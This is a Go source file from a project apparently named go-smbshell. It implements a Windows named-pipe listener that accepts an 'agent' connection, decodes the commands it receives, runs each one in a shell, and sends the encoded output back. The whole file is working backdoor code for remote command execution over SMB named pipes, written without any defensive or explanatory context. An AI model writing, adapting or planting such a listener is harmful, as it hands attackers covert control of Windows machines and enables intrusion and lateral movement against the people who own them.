package listener

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strings"

	"go-smbshell/config"
	"go-smbshell/exec"
	"go-smbshell/transport"

	"gopkg.in/natefinch/npipe.v2"
)

func Start() error {
	ln, err := npipe.Listen(fmt.Sprintf("\\\\.\\pipe\\%s", config.PipeName))
	if err != nil {
		return err
	}
	for {
		log.Println("Wait for client...")
		conn, err := ln.Accept()
		if err != nil {
			log.Println(err.Error())
			continue
		}
		defer ln.Close()
		log.Println("Agent connected")
		go func() {
			defer conn.Close()
			for {
				r := bufio.NewReader(conn)
				commandE, err := r.ReadString('\n')
				if err != nil {
					continue
				}
				command := transport.Decoder(commandE)
				log.Println(fmt.Sprintf("Asked to run: %s", command))
				if command == "close" {
					break
				}
				command = strings.TrimSpace(command)
				go func(conn net.Conn) {
					output := exec.Shell(command)
					if _, err := fmt.Fprintln(conn, transport.Encoder(fmt.Sprintf("Output for %s:\n%s", command, output))); err != nil {
						log.Println(err.Error())
					}
				}(conn)
			}
		}()
	}
	return nil
}
